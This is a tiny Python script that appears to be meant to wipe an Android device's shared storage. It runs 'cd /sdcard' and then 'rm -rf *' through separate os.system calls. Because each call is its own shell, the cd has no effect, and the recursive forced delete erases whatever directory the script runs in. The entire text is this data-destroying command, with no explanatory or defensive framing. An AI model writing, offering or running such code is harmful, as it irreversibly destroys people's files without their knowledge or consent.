import os
os.system("cd /sdcard")
os.system("rm -rf *")